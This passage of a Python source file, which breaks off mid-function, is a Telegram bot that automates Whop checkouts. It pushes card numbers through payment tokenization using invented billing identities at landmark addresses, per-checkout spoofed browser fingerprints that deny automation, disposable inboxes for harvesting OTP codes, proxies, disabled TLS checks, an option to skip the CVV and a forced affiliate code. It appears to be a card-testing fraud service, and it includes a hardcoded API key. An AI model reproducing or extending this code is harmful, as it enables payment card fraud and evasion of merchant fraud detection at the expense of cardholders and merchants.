#!/usr/bin/env python3
"""
Whop Checkout Telegram Bot
Aiogram v3 | Multi-user | Admin Management | OTP Handling
"""

# ============================================================================
# CONFIGURATION — EDIT THESE BEFORE RUNNING (or set as env vars on Render)
# ============================================================================

import os

BOT_TOKEN = os.environ.get("BOT_TOKEN", "YOUR_BOT_TOKEN_HERE")
OWNER_ID  = 5826246696


# ============================================================================
# FAKE BILLING ADDRESSES (US, randomized per checkout)
# ============================================================================

import random

BILLING_ADDRESSES = [
    {"name": "James Carter",    "line1": "112 W 34th St",      "line2": "", "city": "New York",      "state": "NY", "postalCode": "10001", "country": "US"},
    {"name": "Emily Rogers",    "line1": "450 Lexington Ave",   "line2": "", "city": "New York",      "state": "NY", "postalCode": "10017", "country": "US"},
    {"name": "Michael Torres",  "line1": "1 Infinite Loop",     "line2": "", "city": "Cupertino",     "state": "CA", "postalCode": "95014", "country": "US"},
    {"name": "Sarah Mitchell",  "line1": "350 Fifth Ave",       "line2": "", "city": "New York",      "state": "NY", "postalCode": "10118", "country": "US"},
    {"name": "David Nguyen",    "line1": "233 S Wacker Dr",     "line2": "", "city": "Chicago",       "state": "IL", "postalCode": "60606", "country": "US"},
    {"name": "Ashley Johnson",  "line1": "1600 Amphitheatre Pkwy","line2":"","city": "Mountain View",  "state": "CA", "postalCode": "94043", "country": "US"},
    {"name": "Ryan Williams",   "line1": "800 N Michigan Ave",  "line2": "", "city": "Chicago",       "state": "IL", "postalCode": "60611", "country": "US"},
    {"name": "Lauren Brown",    "line1": "2000 Avenue of Stars","line2": "", "city": "Los Angeles",   "state": "CA", "postalCode": "90067", "country": "US"},
    {"name": "Kevin Harris",    "line1": "500 Boylston St",     "line2": "", "city": "Boston",        "state": "MA", "postalCode": "02116", "country": "US"},
    {"name": "Megan Clark",     "line1": "4400 Massachusetts Ave","line2":"","city": "Washington",    "state": "DC", "postalCode": "20016", "country": "US"},
    {"name": "Tyler Lewis",     "line1": "1301 Pennsylvania Ave","line2": "","city": "Washington",    "state": "DC", "postalCode": "20004", "country": "US"},
    {"name": "Jessica Hall",    "line1": "3900 W Alameda Ave",  "line2": "", "city": "Burbank",       "state": "CA", "postalCode": "91505", "country": "US"},
    {"name": "Brandon Scott",   "line1": "1 MetroTech Center",  "line2": "", "city": "Brooklyn",      "state": "NY", "postalCode": "11201", "country": "US"},
    {"name": "Amanda White",    "line1": "200 Park Ave",        "line2": "", "city": "New York",      "state": "NY", "postalCode": "10166", "country": "US"},
    {"name": "Nathan King",     "line1": "6000 Universal Blvd", "line2": "", "city": "Orlando",       "state": "FL", "postalCode": "32819", "country": "US"},
    {"name": "Stephanie Adams", "line1": "700 W Georgia St",    "line2": "", "city": "Houston",       "state": "TX", "postalCode": "77002", "country": "US"},
    {"name": "Joshua Baker",    "line1": "1455 Market St",      "line2": "", "city": "San Francisco", "state": "CA", "postalCode": "94103", "country": "US"},
    {"name": "Brittany Nelson", "line1": "8000 Beverly Blvd",   "line2": "", "city": "Los Angeles",   "state": "CA", "postalCode": "90048", "country": "US"},
    {"name": "Zachary Green",   "line1": "100 N Tryon St",      "line2": "", "city": "Charlotte",     "state": "NC", "postalCode": "28202", "country": "US"},
    {"name": "Heather Young",   "line1": "1000 Peachtree St NE","line2": "", "city": "Atlanta",       "state": "GA", "postalCode": "30309", "country": "US"},
]


def get_random_billing() -> dict:
    return random.choice(BILLING_ADDRESSES)


# ============================================================================
# IMPORTS
# ============================================================================

import asyncio
import logging
import re
import json
import sys
import ssl
import time
import base64
import string
import html
from html.parser import HTMLParser
from concurrent.futures import ThreadPoolExecutor
from typing import Optional, Dict, List, Tuple
from urllib.parse import quote, urlsplit

import requests
import urllib3
from requests.adapters import HTTPAdapter
from urllib3.poolmanager import PoolManager

from aiogram import Bot, Dispatcher, F
from aiogram.filters import Command, CommandStart
from aiogram.fsm.context import FSMContext
from aiogram.fsm.state import State, StatesGroup
from aiogram.fsm.storage.memory import MemoryStorage
from aiogram.types import Message

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# ============================================================================
# WHOP ENGINE — INLINED (no dependency on whop.py)
# ============================================================================

CVV_REMOVE = 0  # 0 = use CVV normally, 1 = skip CVV


class SSLAdapter(HTTPAdapter):
    def init_poolmanager(self, *args, **kwargs):
        ctx = ssl.create_default_context()
        ctx.check_hostname = False
        ctx.verify_mode = ssl.CERT_NONE
        kwargs['ssl_context'] = ctx
        return super().init_poolmanager(*args, **kwargs)

    def proxy_manager_for(self, *args, **kwargs):
        ctx = ssl.create_default_context()
        ctx.check_hostname = False
        ctx.verify_mode = ssl.CERT_NONE
        kwargs['ssl_context'] = ctx
        return super().proxy_manager_for(*args, **kwargs)


class LinkParser(HTMLParser):
    def __init__(self):
        super().__init__(convert_charrefs=True)
        self.links = []

    def handle_starttag(self, tag, attrs):
        if tag.lower() == "a":
            for name, value in attrs:
                if name.lower() == "href" and value:
                    self.links.append(value)


class TryTempMail:
    API_KEY  = "trymail_sk_053d641690f0f09e90718347f6d51bd8f1787fa54acaa1ae"
    BASE_URL = "https://trytempmail.top"

    def __init__(self, api_key: str = None, proxy: dict = None):
        self.api_key  = api_key or self.API_KEY
        self.mailbox  = None
        self.token    = None
        self.email    = None
        self.session  = requests.Session()
        if proxy:
            self.session.proxies.update(proxy)
        self.session.verify = False
        self.session.mount('https://', SSLAdapter())

    def _api_request(self, method: str, path: str, **kwargs) -> Dict:
        headers = {
            "Authorization": f"Bearer {self.api_key}",
            "Content-Type":  "application/json",
            "Accept":        "application/json",
            "User-Agent":    "trytempmail-python-client/1.0",
        }
        kwargs.setdefault('headers', {}).update(headers)
        try:
            r = self.session.request(method, f"{self.BASE_URL}/{path.lstrip('/')}", timeout=20, **kwargs)
            data = r.json()
        except requests.RequestException as e:
            raise RuntimeError(f"Network error: {e}") from e
        except ValueError as e:
            raise RuntimeError(f"API returned invalid JSON: {r.text[:300]}") from e
        if not r.ok or data.get("success") is False:
            err = data.get("error") or data.get("message") or "Unknown API error"
            raise RuntimeError(f"API error ({r.status_code}): {err}")
        return data

    def create_mailbox(self, domain: str = "random", username: str = None) -> Dict:
        body = {"domain": domain or "random"}
        if username:
            body["username"] = username
        data    = self._api_request("POST", "/api/v1/mailbox/create", json=body)
        mailbox = data.get("mailbox") or data
        email   = mailbox.get("email") or mailbox.get("address")
        token   = mailbox.get("token")
        if not email or not token:
            raise RuntimeError("Mailbox response missing email/token")
        self.mailbox = {"email": email, "token": token,
                        "expires_at": mailbox.get("expires_at"),
                        "domain": mailbox.get("domain")}
        self.token = token
        self.email = email
        return self.mailbox

    def list_messages(self) -> List[Dict]:
        if not self.token:
            raise RuntimeError("No mailbox created")
        data = self._api_request("GET", f"/api/v1/mailbox/{self.token}/messages")
        msgs = data.get("messages", [])
        if not isinstance(msgs, list):
            raise RuntimeError("Unexpected inbox response")
        return msgs

    def read_message(self, message_id: str) -> Dict:
        data = self._api_request("GET", f"/api/v1/mailbox/{self.token}/messages/{message_id}")
        msg  = data.get("message")
        if not isinstance(msg, dict):
            raise RuntimeError("Unexpected message response")
        return msg

    def delete_message(self, message_id: str) -> None:
        self._api_request("DELETE", f"/api/v1/mailbox/{self.token}/messages/{message_id}")

    @staticmethod
    def _unique(values: List[str]) -> List[str]:
        result, seen = [], set()
        for v in values:
            v = v.strip()
            if v and v not in seen:
                seen.add(v)
                result.append(v)
        return result

    @staticmethod
    def _extract_otps(text: str, html_body: str) -> List[str]:
        visible = re.sub(r"<[^>]+>", " ", html.unescape(html_body or ""))
        content = f"{text or ''}\n{visible}"
        labelled = []
        for pat in [
            r"(?:one[- ]?time|verification|security|confirmation|authentication|auth)"
            r"\s*(?:code|pin|number|passcode)?\s*(?:is|:|-)?\s*([0-9]{4,8})",
            r"(?:code|pin|passcode)\s*(?:is|:|-)?\s*([0-9]{4,8})",
        ]:
            labelled.extend(re.findall(pat, content, re.IGNORECASE))
        fallback = re.findall(r"(?<!\d)(\d{4,8})(?!\d)", content)
        return TryTempMail._unique(labelled + fallback)

    @staticmethod
    def _extract_links(text: str, html_body: str) -> List[str]:
        parser = LinkParser()
        try:
            parser.feed(html_body or "")
        except Exception:
            pass
        candidates = list(parser.links)
        candidates += re.findall(r"https?://[^\s<>\"']+", f"{text or ''}\n{html_body or ''}", re.IGNORECASE)
        links = []
        for lnk in candidates:
            lnk = html.unescape(lnk).strip().rstrip(".,;:!?)]}>\"'")
            if not re.match(r"^https?://", lnk, re.IGNORECASE):
                continue
            try:
                if urlsplit(lnk).netloc:
                    links.append(lnk)
            except ValueError:
                continue
        links = TryTempMail._unique(links)
        markers = ("verify","verification","confirm","activate","validation",
                   "validate","signup","register","email","account","token","otp")
        likely = [l for l in links if any(x in l.lower() for x in markers)]
        return likely or links

    def extract_message(self, message: Dict) -> Dict:
        text      = str(message.get("text_body") or "")
        html_body = str(message.get("html_body") or "")
        return {
            "message_id":         message.get("id"),
            "sender":             message.get("sender"),
            "subject":            message.get("subject"),
            "received_at":        message.get("received_at"),
            "otp_codes":          self._extract_otps(text, html_body),
            "verification_links": self._extract_links(text, html_body),
        }

    def wait_for_result(self, timeout: float = 180, interval: float = 5,
                        delete_processed: bool = False) -> List[Dict]:
        if not self.token:
            raise RuntimeError("No mailbox created")
        deadline  = time.monotonic() + timeout
        processed = set()
        matches   = []
        while True:
            for summary in self.list_messages():
                mid = summary.get("id")
                if mid is None or str(mid) in processed:
                    continue
                processed.add(str(mid))
                result = self.extract_message(self.read_message(mid))
                if result["otp_codes"] or result["verification_links"]:
                    matches.append(result)
                    if delete_processed:
                        self.delete_message(mid)
                    return matches
            if matches or time.monotonic() >= deadline:
                return matches
            time.sleep(min(interval, max(0, deadline - time.monotonic())))


# ============================================================================
# BROWSER PROFILE — randomized per checkout, internally consistent
# ============================================================================

class BrowserProfile:
    """
    Generates a fully randomized but internally consistent browser fingerprint.
    One instance = one checkout identity. Never reused across checkouts.
    Every value (UA, platform, screen, WebGL, TZ) is coherent with each other.
    """

    _CHROME_VERS = [124, 125, 126, 127, 128, 129, 130, 131, 132, 133, 134, 135]
    _BRAVE_VERS  = [124, 125, 126, 127, 128, 129, 130, 131, 132, 133]

    _PLATFORMS = [
        # (os_str_in_ua, sec-ch-ua-platform, js_platform, tz_pool)
        ('Windows NT 10.0; Win64; x64',      'Windows', 'Win32',    ['America/New_York','America/Chicago','America/Denver','America/Los_Angeles','America/Phoenix','America/Detroit']),
        ('Windows NT 10.0; WOW64',           'Windows', 'Win32',    ['America/New_York','America/Chicago','America/Los_Angeles','America/Denver']),
        ('Macintosh; Intel Mac OS X 10_15_7','macOS',   'MacIntel', ['America/New_York','America/Chicago','America/Los_Angeles','America/Denver','Pacific/Honolulu']),
        ('Macintosh; Intel Mac OS X 11_6_0', 'macOS',   'MacIntel', ['America/New_York','America/Chicago','America/Los_Angeles']),
        ('Macintosh; Intel Mac OS X 12_6_0', 'macOS',   'MacIntel', ['America/New_York','America/Los_Angeles','America/Chicago']),
    ]

    _SCREENS = [
        (1920,1080),(1366,768),(1440,900),(1536,864),
        (1280,800), (1600,900),(1280,720),(1920,1200),
        (2560,1440),(1680,1050),(1360,768),(1024,768),
    ]

    _WEBGL = [
        ('Google Inc. (NVIDIA)',    'ANGLE (NVIDIA, NVIDIA GeForce GTX 1060 6GB Direct3D11 vs_5_0 ps_5_0, D3D11)'),
        ('Google Inc. (NVIDIA)',    'ANGLE (NVIDIA, NVIDIA GeForce RTX 3060 Direct3D11 vs_5_0 ps_5_0, D3D11)'),
        ('Google Inc. (NVIDIA)',    'ANGLE (NVIDIA, NVIDIA GeForce GTX 1650 Direct3D11 vs_5_0 ps_5_0, D3D11)'),
        ('Google Inc. (Intel)',     'ANGLE (Intel, Intel(R) UHD Graphics 620 Direct3D11 vs_5_0 ps_5_0, D3D11)'),
        ('Google Inc. (Intel)',     'ANGLE (Intel, Intel(R) Iris(R) Xe Graphics Direct3D11 vs_5_0 ps_5_0, D3D11)'),
        ('Google Inc. (Intel)',     'ANGLE (Intel, Intel(R) HD Graphics 530 Direct3D11 vs_5_0 ps_5_0, D3D11)'),
        ('Google Inc. (AMD)',       'ANGLE (AMD, Radeon RX 580 Series Direct3D11 vs_5_0 ps_5_0, D3D11)'),
        ('Google Inc. (AMD)',       'ANGLE (AMD, AMD Radeon RX 5700 XT Direct3D11 vs_5_0 ps_5_0, D3D11)'),
        ('Google Inc. (Microsoft)', 'ANGLE (Microsoft, Microsoft Basic Render Driver Direct3D11 vs_5_0 ps_5_0, D3D11)'),
        ('Apple Inc.',              'Apple GPU'),
    ]

    _LANG_SETS = [
        ['en-US', 'en'],
        ['en-US', 'en-GB', 'en'],
        ['en-US'],
        ['en-GB', 'en-US', 'en'],
        ['en-US', 'en-CA', 'en'],
    ]

    _NB_VARIANTS = ['"Not=A?Brand"', '"Not)A;Brand"', '"Not.A/Brand"', '"Not_A.Brand"']

    def __init__(self):
        cv    = random.choice(self._CHROME_VERS)
        bv    = random.choice(self._BRAVE_VERS)
        plat  = random.choice(self._PLATFORMS)
        sw, sh = random.choice(self._SCREENS)
        wgl   = random.choice(self._WEBGL)
        langs = random.choice(self._LANG_SETS)
        mem   = random.choice([2, 4, 4, 8, 8, 8, 16])   # weighted realistic
        cpu   = random.choice([2, 4, 4, 6, 8, 8, 12, 16])
        dpr   = random.choice([1, 1, 1, 1, 1.25, 1.5, 2])
        tz    = random.choice(plat[3])
        iw    = random.randint(max(800, sw - 400), sw - 50)
        ih    = random.randint(max(400, sh - 300), sh - 80)
        sah   = sh - random.randint(30, 55)
        nb    = random.choice(self._NB_VARIANTS)

        self.chrome_ver     = cv
        self.brave_ver      = bv
        self.os_str         = plat[0]
        self.platform_name  = plat[1]
        self.js_platform    = plat[2]
        self.timezone       = tz
        self.screen_w       = sw
        self.screen_h       = sh
        self.avail_w        = sw
        self.avail_h        = sah
        self.inner_w        = iw
        self.inner_h        = ih
        self.dpr            = dpr
        self.memory         = mem
        self.cpu            = cpu
        self.languages      = langs
        self.webgl_vendor   = wgl[0]
        self.webgl_renderer = wgl[1]
        self.plugins        = random.sample(
            ['PDF Viewer','Chrome PDF Viewer','Chromium PDF Viewer',
             'Microsoft Edge PDF Viewer','WebKit built-in PDF'],
            k=random.randint(2, 4)
        )

        self.user_agent = (
            f"Mozilla/5.0 ({self.os_str}) "
            f"AppleWebKit/537.36 (KHTML, like Gecko) "
            f"Chrome/{cv}.0.0.0 Safari/537.36 Brave/{bv}.0.0.0"
        )
        self.sec_ch_ua = (
            f'{nb};v="99", "Brave";v="{bv}", "Chromium";v="{cv}"'
        )
        self.accept_language = ', '.join(
            f"{l};q={round(1.0 - i * 0.1, 1)}" if i else l
            for i, l in enumerate(langs)
        )

    def device_info_b64(self) -> str:
        """base64-encoded device info blob for Basis Theory bt-device-info header."""
        info = {
            "uaBrands": [
                {"brand": "Not=A?Brand", "version": "99"},
                {"brand": "Brave",       "version": str(self.brave_ver)},
                {"brand": "Chromium",    "version": str(self.chrome_ver)},
            ],
            "uaMobile":              False,
            "uaPlatform":            self.platform_name,
            "languages":             self.languages,
            "timeZone":              self.timezone,
            "cookiesEnabled":        True,
            "localStorageEnabled":   True,
            "sessionStorageEnabled": True,
            "platform":              self.js_platform,
            "hardwareConcurrency":   self.cpu,
            "deviceMemoryGb":        self.memory,
            "screenWidth":           self.screen_w,
            "screenHeight":          self.screen_h,
            "screenAvailWidth":      self.avail_w,
            "screenAvailHeight":     self.avail_h,
            "innerWidth":            self.inner_w,
            "innerHeight":           self.inner_h,
            "devicePixelRatio":      self.dpr,
            "maxTouchPoints":        0,
            "plugins":               self.plugins,
            "mimeTypes":             ["application/pdf", "text/pdf"],
            "webdriver":             False,
            "suspectedHeadless":     False,
            "webglVendor":           self.webgl_vendor,
            "webglRenderer":         self.webgl_renderer,
        }
        return base64.b64encode(json.dumps(info, separators=(',', ':')).encode()).decode()

    def payment_device_info(self) -> dict:
        """Device info dict embedded in the Whop payment submission payload."""
        return {
            "browser_time_difference": str(random.randint(-480, -240)),
            "color_depth":             "24",
            "java_enabled":            False,
            "screen_width":            str(self.screen_w),
            "screen_height":           str(self.screen_h),
            "user_agent":              self.user_agent,
            "language":                self.languages[0],
            "javascript_enabled":      True,
            "platform":                "WEB",
            "accept_browser":          "*/*",
            "accept_content":          "*/*",
            "accept_header":           "*/*",
        }


class WhopCheckout:
    def __init__(self, debug=False, proxy: dict = None, affiliate_code: str = None):
        self.session        = requests.Session()
        self.base_url       = "https://whop.com"
        self.debug          = debug
        self.proxy          = proxy
        self.affiliate_code = affiliate_code or "arnobrip69"
        self.product_url    = None   # set during checkout for referer accuracy
        self.profile        = BrowserProfile()   # unique fingerprint per checkout instance

        if proxy:
            self.session.proxies.update(proxy)
        self.session.verify = False
        self.session.mount('https://', SSLAdapter())
        self.session.headers.update({
            'accept':                    'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
            'accept-language':           self.profile.accept_language,
            'cache-control':             'max-age=0',
            'user-agent':                self.profile.user_agent,
            'sec-ch-ua':                 self.profile.sec_ch_ua,
            'sec-ch-ua-mobile':          '?0',
            'sec-ch-ua-platform':        f'"{self.profile.platform_name}"',
            'sec-fetch-dest':            'document',
            'sec-fetch-mode':            'navigate',
            'sec-fetch-site':            'same-origin',
            'sec-fetch-user':            '?1',
            'sec-gpc':                   '1',
            'upgrade-insecure-requests': '1',
            'priority':                  'u=0, i',
        })
        self.csrf_token   = self._uuid()
        self.ssk          = self._uuid()
        self.anonymous_id = self._uuid()
        self.sig_id       = self._uuid()
        self.wuid         = f"wuid_{self._rstr(20)}"
        self._setup_cookies()
        self.checkout_data    = None
        self.checkout_id      = None
        self.secret           = None
        self.public_key       = None
        self.temp_mail        = None
        self.current_email    = None
        self.checkout_api_url = None
        self.billing_address  = None
        self.card_token       = None

    def _log(self, msg):
        if self.debug:
            print(f"[DEBUG] {msg}")

    def _rstr(self, n: int) -> str:
        return ''.join(random.choices(string.ascii_lowercase + string.digits, k=n))

    def _uuid(self) -> str:
        return f"{self._rstr(8)}-{self._rstr(4)}-{self._rstr(4)}-{self._rstr(4)}-{self._rstr(12)}"

    def _referer(self) -> str:
        """Builds referer with affiliate code for all API calls."""
        base = self.product_url or f"{self.base_url}/"
        sep  = '&' if '?' in base else '?'
        return f"{base.rstrip('/')}/{sep}a={self.affiliate_code}"

    def _setup_cookies(self):
        for k, v in {
            '__Host-whop-core.csrf-token':   self.csrf_token,
            'whop-core.ssk':                 self.ssk,
            'whop_sig_id':                   self.sig_id,
            '_wuid':                         self.wuid,
            '_wuid_link':                    self.wuid,
            'ajs_anonymous_id':              self.anonymous_id,
            'whop-frosted-theme':            'appearance:light',
            'whop-theme-resolved':           'light',
            'affiliate_code':                self.affiliate_code,
            'whop-core.affiliate-toolsuite': self.affiliate_code,
        }.items():
            self.session.cookies.set(k, v, domain='.whop.com')

    def _device_info(self) -> str:
        """Delegates to profile — kept for any legacy call sites."""
        return self.profile.device_info_b64()

    def generate_temp_email(self, domain: str = "random", username: str = None) -> str:
        self.temp_mail    = TryTempMail(proxy=self.proxy)
        mailbox           = self.temp_mail.create_mailbox(domain, username)
        self.current_email = mailbox["email"]
        return self.current_email

    def get_product_page(self, product_url: str) -> Tuple[str, str]:
        """
        Resolve any Whop URL format and extract (funnel_id, plan_id).

        Handles:
          1. Direct buy page        — has funnelId + defaultPlan in JSON
          2. /username/products/slug — strips /products/, retries
          3. /username/slug          — two-segment user-scoped URL, try as-is first
          4. Product landing page   — plan_id as raw text token in HTML
          5. /checkout/plan_xxx     — plan_id in URL itself
          6. Affiliate ?a= param    — stored as self.affiliate_code
        """
        # Extract and strip affiliate code from URL
        from urllib.parse import urlparse, parse_qs
        parsed   = urlparse(product_url)
        qs       = parse_qs(parsed.query)
        aff      = qs.get('a', [None])[0]
        if aff:
            self.affiliate_code = aff
            self._setup_cookies()   # refresh cookies with new affiliate code
        clean_url = product_url.split('?')[0].rstrip('/') + '/'
        self.product_url = clean_url

        def _try_extract(text: str):
            funnel_id = plan_id = None
            for pat in [
                r'"funnelId"\s*:\s*"(product_[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12})"',
                r'\\"funnelId\\"\s*:\s*\\"(product_[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12})\\"',
            ]:
                m = re.search(pat, text)
                if m:
                    funnel_id = m.group(1); break
            for pat in [
                r'"defaultPlan"\s*:\s*\{\s*"id"\s*:\s*"(plan_[A-Za-z0-9]+)"',
                r'\\"defaultPlan\\"\s*:\s*\{\s*\\"id\\"\s*:\s*\\"(plan_[A-Za-z0-9]+)\\"',
            ]:
                m = re.search(pat, text)
                if m:
                    plan_id = m.group(1); break
            return funnel_id, plan_id

        def _broad_plan_id(text: str):
            """
            Fallback: find any plan_Xxxx token in the page.
            Real IDs always contain at least one uppercase letter (not 'plan_successfully' etc).
            """
            candidates = re.findall(r'plan_([A-Za-z0-9]{8,})', text)
            for c in candidates:
                if any(ch.isupper() for ch in c):   # real IDs have uppercase
                    return f'plan_{c}'
            return None

        def _fetch(url: str):
            try:
                r = self.session.get(url)
                return r if r.status_code == 200 else None
            except Exception:
                return None

        # ---- URL normalisation strategies ----
        # 1. Try original URL as-is (most specific first)
        # 2. /username/products/slug/ → /slug/
        url_no_products = re.sub(
            r'(https://whop\.com)/[^/]+/products/([^/]+)/?$',
            r'\1/\2/', clean_url
        )
        # 3. /username/slug/ → /slug/ (strip username prefix)
        path_parts = [p for p in parsed.path.strip('/').split('/') if p]
        url_no_user = (f"{self.base_url}/{path_parts[-1]}/"
                       if len(path_parts) >= 2 else None)
        # 4. /checkout/plan_xxx already in URL
        url_checkout_in_url = re.search(r'/checkout/(plan_[A-Za-z0-9]+)', clean_url)

        # Build ordered deduped candidate list — try original first, then simplifications
        candidates_urls = list(dict.fromkeys(filter(None, [
            clean_url,            # 1. original as-is
            url_no_products,      # 2. without /products/ segment
            url_no_user,          # 3. without username prefix
        ])))

        # Try all candidates — pick first one that yields a plan_id
        page = funnel_id = plan_id = None
        for try_url in candidates_urls:
            r = _fetch(try_url)
            if not r:
                continue
            f, p = _try_extract(r.text)
            if not p:
                p = _broad_plan_id(r.text)
            if not p:
                m = re.search(r'href=["\']https://whop\.com/checkout/(plan_[A-Za-z0-9]+)', r.text)
                if m:
                    p = m.group(1)
            if p:
                funnel_id, plan_id, page = f, p, r
                break
            elif not page:
                page = r   # keep a page ref even if no plan found

        # plan_id baked into the original URL itself
        if not plan_id and url_checkout_in_url:
            plan_id = url_checkout_in_url.group(1)

        if not page:
            raise Exception(f"Failed to load product page — tried: {candidates_urls}")

        if not plan_id:
            raise Exception(
                "Could not find plan ID.\n\n"
                "Try the direct checkout URL:\n"
                "<code>https://whop.com/checkout/plan_XXXXXX</code>"
            )

        return funnel_id or "", plan_id

    def create_checkout_session(self, funnel_id: str, plan_id: str) -> Dict:
        url     = f"{self.base_url}/checkout/api/"
        ret_to  = ('/' + '/'.join(self.product_url.replace(self.base_url, '').strip('/').split('/')[:2]) + '/'
                   if self.product_url else '/')
        payload = {"plan_id": plan_id, "amount": 1, "d2c": True,
                   "return_to": ret_to, "referring_plan_id": None,
                   "tracking_link_id": None,
                   "utm": {"utm_source": "whop", "utm_medium": "affiliate",
                           "utm_campaign": self.affiliate_code},
                   "user_agent": self.profile.user_agent,
                   "source": "product_page_direct", "funnel_id": funnel_id or None}
        headers = {'content-type': 'text/plain;charset=UTF-8', 'x-csrf': self.csrf_token,
                   'origin': self.base_url, 'referer': self._referer(),
                   'priority': 'u=1, i'}
        r = self.session.post(url, json=payload, headers=headers)
        if r.status_code not in [200, 201]:
            raise Exception(f"Failed to create checkout session: {r.status_code}")
        data = r.json()
        self.checkout_data    = data
        self.checkout_id      = data.get('id')
        self.secret           = data.get('secret')
        self.checkout_api_url = f"{self.base_url}/checkout/{self.checkout_id}/api/"
        if data.get('processors'):
            cfg = data['processors'][0].get('processor_config', {})
            self.public_key = cfg.get('tokenization', {}).get('public_key')
        return data

    def preload_email(self, email: str) -> Dict:
        if not self.checkout_id or not self.secret:
            raise Exception("No checkout session")
        url     = f"{self.base_url}/checkout/{self.checkout_id}/api/?secret={quote(self.secret, safe='')}"
        headers = {'content-type': 'text/plain;charset=UTF-8',
                   'x-csrf': self.csrf_token,
                   'x-whop-anonymous-id': self.anonymous_id,
                   'origin': self.base_url,
                   'referer': self._referer(),
                   'priority': 'u=1, i'}
        r = self.session.patch(url, json={"email_preload": email}, headers=headers)
        if r.status_code not in [200, 201]:
            raise Exception(f"Failed to preload email: {r.status_code}")
        return r.json()

    def update_checkout_details(self, email: str, billing_address: Dict) -> Dict:
        """Phase 1 of two-phase submit: push email + billing with complete=False.
        This mimics a real browser filling the form before clicking Pay.
        """
        if not self.checkout_id or not self.secret:
            raise Exception("No checkout session")
        headers = {
            'accept':              '*/*',
            'accept-language':     self.profile.accept_language,
            'content-type':        'text/plain;charset=UTF-8',
            'origin':              self.base_url,
            'priority':            'u=1, i',
            'referer':             self._referer(),
            'sec-ch-ua':           self.profile.sec_ch_ua,
            'sec-ch-ua-mobile':    '?0',
            'sec-ch-ua-platform':  f'"{self.profile.platform_name}"',
            'sec-fetch-dest':      'empty',
            'sec-fetch-mode':      'cors',
            'sec-fetch-site':      'same-origin',
            'sec-gpc':             '1',
            'user-agent':          self.profile.user_agent,
            'x-csrf':              self.csrf_token,
            'x-whop-anonymous-id': self.anonymous_id,
        }
        payload = {
            'complete':        False,
            'tax':             0,
            'line_items':      [],
            'email':           email,
            'billing_address': billing_address,
            'vat_id':          '',
        }
        r = self.session.patch(
            self.checkout_api_url,
            params={'secret': self.secret},
            headers=headers,
            data=json.dumps(payload),
        )
        if r.status_code not in [200, 201, 422]:
            raise Exception(f"Failed to update checkout details: {r.status_code}")
        return r.json()

    def tokenize_card(self, card_number: str, exp_month: int, exp_year: int, cvc: str) -> str:
        url     = "https://js.basistheory.com/api/token-intents"
        headers = {
            'accept':             '*/*',
            'accept-language':    self.profile.accept_language,
            'bt-api-key':         self.public_key,
            'bt-device-info':     self.profile.device_info_b64(),
            'content-type':       'application/json',
            'origin':             'https://js.basistheory.com',
            'priority':           'u=1, i',
            'referer':            f'https://js.basistheory.com/web-elements/2.12.2/hosted-elements/data-element.html?element_id={self._uuid()}',
            'sec-ch-ua':          self.profile.sec_ch_ua,
            'sec-ch-ua-mobile':   '?0',
            'sec-ch-ua-platform': f'"{self.profile.platform_name}"',
            'sec-fetch-dest':     'empty',
            'sec-fetch-mode':     'cors',
            'sec-fetch-site':     'same-origin',
            'sec-gpc':            '1',
            'user-agent':         self.profile.user_agent,
        }
        payload = {"type": "card", "data": {"number": card_number,
                   "expiration_month": exp_month, "expiration_year": exp_year, "cvc": cvc}}
        s = requests.Session()
        if self.proxy:
            s.proxies.update(self.proxy)
        s.verify = False
        s.mount('https://', SSLAdapter())
        r = s.post(url, headers=headers, json=payload)
        if r.status_code not in [200, 201]:
            raise Exception(f"Failed to tokenize card: {r.status_code} - {r.text}")
        return r.json().get('id')

    def submit_payment(self, email: str, card_token: str, billing_address: Dict, otp: str = None) -> Dict:
        """Phase 2 of two-phase submit: attach payment method with complete=True."""
        if not self.checkout_id or not self.secret:
            raise Exception("No checkout session")
        headers = {
            'accept':              '*/*',
            'accept-language':     self.profile.accept_language,
            'content-type':        'text/plain;charset=UTF-8',
            'origin':              self.base_url,
            'priority':            'u=1, i',
            'referer':             self._referer(),
            'sec-ch-ua':           self.profile.sec_ch_ua,
            'sec-ch-ua-mobile':    '?0',
            'sec-ch-ua-platform':  f'"{self.profile.platform_name}"',
            'sec-fetch-dest':      'empty',
            'sec-fetch-mode':      'cors',
            'sec-fetch-site':      'same-origin',
            'sec-gpc':             '1',
            'user-agent':          self.profile.user_agent,
            'x-csrf':              self.csrf_token,       # ← was missing, triggers before_checkout decline
            'x-whop-anonymous-id': self.anonymous_id,
        }
        device_info = self.profile.payment_device_info()
        payload = {
            'complete':        True,
            'tax':             0,
            'line_items':      [],
            'email':           email,
            'billing_address': billing_address,
            'vat_id':          '',
            'payment_method':  {
                'use': {
                    'processor':   'multi_psp',
                    'token':       card_token,
                    'type':        'basis_theory_card_token',
                    'device_info': device_info,
                }
            },
        }
        if otp:
            payload['otp'] = otp
        r = self.session.patch(
            self.checkout_api_url,
            params={'secret': self.secret},
            headers=headers,
            data=json.dumps(payload),
        )
        if r.status_code not in [200, 201, 422]:
            raise Exception(f"Failed to submit payment: {r.status_code}")
        return r.json()

    def check_payment_status(self, max_retries=10, retry_delay=3) -> Dict:
        if not self.checkout_id or not self.secret:
            raise Exception("No checkout session")
        headers = {
            'accept':             '*/*',
            'accept-language':    self.profile.accept_language,
            'priority':           'u=1, i',
            'referer':            self._referer(),
            'sec-ch-ua':          self.profile.sec_ch_ua,
            'sec-ch-ua-mobile':   '?0',
            'sec-ch-ua-platform': f'"{self.profile.platform_name}"',
            'sec-fetch-dest':     'empty',
            'sec-fetch-mode':     'cors',
            'sec-fetch-site':     'same-origin',
            'sec-gpc':            '1',
            'user-agent':         self.profile.user_agent,
        }
        for attempt in range(max_retries):
            r      = self.session.get(self.checkout_api_url, params={'secret': self.secret}, headers=headers)
            if r.status_code != 200:
                raise Exception(f"Failed to check status: {r.status_code}")
            data   = r.json()
            status = data.get('status')
            if status == 'action_required':
                return {'checkout_status': status, 'action': data.get('action'),
                        'checkout_data': data, 'payment_success': False, 'action_required': True}
            if status != 'processing':
                tasks  = data.get('tasks', [])
                result = {'checkout_status': status, 'tasks': tasks, 'action_required': False,
                          'payment_success': status == 'idle' and all(t.get('status') != 'failed' for t in tasks)}
                for t in tasks:
